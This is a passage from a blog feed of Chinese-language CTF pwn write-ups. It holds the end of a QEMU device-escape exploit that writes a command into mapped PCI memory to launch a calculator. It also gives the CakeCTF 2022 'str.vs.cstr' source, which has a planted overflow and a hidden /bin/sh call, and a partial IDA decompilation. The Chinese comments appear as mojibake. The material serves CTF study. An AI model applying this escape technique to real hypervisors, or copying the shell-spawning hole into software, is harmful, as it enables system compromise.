class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/io.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;inttypes.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;./head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">uint64_t</span> u64;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> *mmio_mem;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">mmio_read</span><span class=\"params\">(u64 dst)</span>&#123;</span><br><span class=\"line\">  assert(dst + mmio_mem &gt; mmio_mem);</span><br><span class=\"line\">  u64 ret = *((u64 *)(mmio_mem + dst));</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;mmio_read&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// qemuä¸­å¹¶æ²¡æœ‰çœŸçš„å¯¹qemuçš„çš„å†…å­˜è¯»å†™</span></span><br><span class=\"line\"><span class=\"comment\">// ä½œä¸ºå‚æ•°ä¼ é€’ç»™qemuçš„write</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">mmio_write</span><span class=\"params\">(u64 cho, u64 idx, <span class=\"type\">char</span> chr)</span>&#123;</span><br><span class=\"line\">  u64 dst = ((cho &amp; <span class=\"number\">0xf</span>) &lt;&lt; <span class=\"number\">20</span>);</span><br><span class=\"line\">  u64 val = <span class=\"number\">0</span>;</span><br><span class=\"line\">  dst |= ((idx &amp; <span class=\"number\">0xf</span>) &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;dst is %d&quot;</span>, dst);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(cho == <span class=\"number\">6</span>)&#123;</span><br><span class=\"line\">    val = chr;</span><br><span class=\"line\">    dst = idx;</span><br><span class=\"line\">    dst |= ((cho &amp; <span class=\"number\">0xf</span>) &lt;&lt; <span class=\"number\">20</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  *((u64 *)(mmio_mem + dst)) = val;</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;mmio_write&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_cheats</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// aWwssadadbaba </span></span><br><span class=\"line\">  mmio_write(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">2</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">2</span>,<span class=\"number\">6</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">3</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">5</span>,<span class=\"number\">8</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">4</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">5</span>,<span class=\"number\">10</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">4</span>,<span class=\"number\">11</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;write_cheats&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_cmd</span><span class=\"params\">(<span class=\"type\">char</span> *cmd)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"built_in\">strlen</span>(cmd); i++)</span><br><span class=\"line\">    mmio_write(<span class=\"number\">6</span>, i, cmd[i]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> mmio_fd = open(</span><br><span class=\"line\">    <span class=\"string\">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,</span><br><span class=\"line\">    O_RDWR | O_SYNC</span><br><span class=\"line\">  );</span><br><span class=\"line\">  mmio_mem = mmap(</span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"number\">0x1000000</span>,</span><br><span class=\"line\">    PROT_WRITE | PROT_READ,</span><br><span class=\"line\">    MAP_SHARED, mmio_fd, <span class=\"number\">0</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(mmio_mem == MAP_FAILED)</span><br><span class=\"line\">    Abort(<span class=\"string\">&quot;mmap&quot;</span>);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;mmio_mem is 0x%lx&quot;</span>, mmio_mem);</span><br><span class=\"line\">  write_cheats();</span><br><span class=\"line\">  write_cmd(<span class=\"string\">&quot;xcalc&quot;</span>);<span class=\"comment\">// gnome-calculator ä¹Ÿè¡Œ</span></span><br><span class=\"line\">  mmio_read((<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">20</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Linux",
                "virtualization"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/09/12/2022-cakeCTF-pwn-wp/",
            "url": "https://squirre17.github.io/2022/09/12/2022-cakeCTF-pwn-wp/",
            "title": "2022-cakeCTF-pwn-wp",
            "date_published": "2022-09-12T11:39:37.000Z",
            "content_html": "<p><a href=\"https://2022.cakectf.com/tasks/1538875340/\">CakeCTF 2022</a></p>\n<h1 id=\"welkerme\"><a class=\"markdownIt-Anchor\" href=\"#welkerme\">#</a> welkerme</h1>\n<p>æ²¡å¼€ kaslr æ²¡å¼€ smep<br>\n æ‰¾åˆ° cc å’Œ pkc ä¸€æŠŠæ¢­äº†</p>\n<h1 id=\"strvscstr\"><a class=\"markdownIt-Anchor\" href=\"#strvscstr\">#</a> str.vs.cstr</h1>\n<p>c++ ç®€å•æº¢å‡º<br>\næ²¡å¼€ pie å’Œ relro</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;array&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Test</span> &#123;</span></span><br><span class=\"line\">\tTest() &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">std</span>::fill(_c_str, _c_str + <span class=\"number\">0x20</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* <span class=\"title function_\">c_str</span><span class=\"params\">()</span> &#123; <span class=\"keyword\">return</span> _c_str; &#125;</span><br><span class=\"line\">\t<span class=\"built_in\">std</span>::<span class=\"built_in\">string</span>&amp; <span class=\"title function_\">str</span><span class=\"params\">()</span> &#123; <span class=\"keyword\">return</span> _str; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private:</span><br><span class=\"line\">\t__attribute__((used))</span><br><span class=\"line\">\t<span class=\"type\">void</span> <span class=\"title function_\">call_me</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">std</span>::system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> _c_str[<span class=\"number\">0x20</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> _str;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\tTest test;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">std</span>::setbuf(<span class=\"built_in\">stdin</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">std</span>::setbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;1. set c_str&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span></span><br><span class=\"line\">\t\t\t\t\t\t&lt;&lt; <span class=\"string\">&quot;2. get c_str&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span></span><br><span class=\"line\">\t\t\t\t\t\t&lt;&lt; <span class=\"string\">&quot;3. set str&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span></span><br><span class=\"line\">\t\t\t\t\t\t&lt;&lt; <span class=\"string\">&quot;4. get str&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span>.good()) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> choice = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;choice: &quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span> &gt;&gt; choice;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">switch</span> (choice) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>: <span class=\"comment\">// set c_str</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;c_str: &quot;</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span> &gt;&gt; test.c_str();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>: <span class=\"comment\">// get c_str</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;c_str: &quot;</span> &lt;&lt; test.c_str() &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>: <span class=\"comment\">// set str</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;str: &quot;</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span> &gt;&gt; test.str();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>: <span class=\"comment\">// get str</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;str: &quot;</span> &lt;&lt; test.str() &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">default</span>: <span class=\"comment\">// otherwise exit</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;bye!&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>å¯¹ç…§ ida æ¥çœ‹<br>\nå®šä¹‰çš„å‡½æ•°è¿å‡½æ•°æŒ‡é’ˆéƒ½æ²¡æ”¾åœ¨ç»“æ„ä½“åŠ› åªæœ‰ string çš„æŒ‡é’ˆå’Œ char è¿™ä¸ªå­—ç¬¦æ•°ç»„</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v5; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v6; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v8; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v9; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v10; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v11; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  __int64 v12; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v13; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v14; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v15; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  __int64 v16; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v17; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v18; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v19; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> choice; <span class=\"comment\">// [rsp+Ch] [rbp-64h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> test[<span class=\"number\">72</span>]; <span class=\"comment\">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v23; <span class=\"comment\">// [rsp+58h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v23 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  Test::Test((Test *)test);                     <span class=\"comment\">// åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span></span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  v3 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;1. set c_str&quot;</span>);</span><br><span class=\"line\">  v4 = <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v3, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">  v5 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(v4, <span class=\"string\">&quot;2. get c_str&quot;</span>);</span><br><span class=\"line\">  v6 = <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v5, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">  v7 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(v6, <span class=\"string\">&quot;3. set str&quot;</span>);</span><br><span class=\"line\">  v8 = <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v7, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">  v9 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(v8, <span class=\"string\">&quot;4. get str&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v9, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( (<span class=\"type\">unsigned</span> __int8)<span class=\"built_in\">std</span>::ios::good(&amp;unk_404230) )<span class=\"comment\">// ctrl + d exit good</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    choice = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;choice: &quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::istream::operator&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span>, &amp;choice);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( choice == <span class=\"number\">4</span> )                          <span class=\"comment\">// std::cout &lt;&lt; &quot;str: &quot; &lt;&lt; test.str() &lt;&lt; std::endl;</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v15 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;str: &quot;</span>);</span><br><span class=\"line\">      v16 = Test::str[abi:cxx11](test);         <span class=\"comment\">// [1] &lt;&lt;- å…¶å®å°±æ˜¯è¿”å›ä¸€ä¸ªåœ°å€</span></span><br><span class=\"line\">      v17 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"type\">char</span>&gt;(v15, v16);</span><br><span class=\"line\">      <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v17, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( choice &gt; <span class=\"number\">4</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_13;</span><br><span class=\"line\">      <span class=\"keyword\">switch</span> ( choice )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">3</span>:                                 <span class=\"comment\">// std::cout &lt;&lt; &quot;str: &quot;;</span></span><br><span class=\"line\">          <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;str: &quot;</span>);</span><br><span class=\"line\">          v14 = Test::str[abi:cxx11](test);</span><br><span class=\"line\">          <span class=\"built_in\">std</span>::operator&gt;&gt;&lt;<span class=\"type\">char</span>&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span>, v14);<span class=\"comment\">// std::cin &gt;&gt; test.str();</span></span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">1</span>:                                 <span class=\"comment\">// std::cout &lt;&lt; &quot;c_str: &quot;;</span></span><br><span class=\"line\">          <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;c_str: &quot;</span>);</span><br><span class=\"line\">          v10 = Test::c_str((Test *)test);      <span class=\"comment\">// return this</span></span><br><span class=\"line\">          <span class=\"built_in\">std</span>::operator&gt;&gt;&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span>, v10);<span class=\"comment\">// std::cin &gt;&gt; test.c_str();</span></span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">2</span>:                                 <span class=\"comment\">// std::cout &lt;&lt; &quot;c_str: &quot; &lt;&lt; test.c_str() &lt;&lt; std::endl;</span></span><br><span class=\"line\">          v11 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;c_str: &quot;</span>);</span><br><span class=\"line\">          v12 = Test::c_str((Test *)test);</span><br><span class=\"line\">          v13 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(v11, v12);</span><br><span class=\"line\">          <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v13, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span 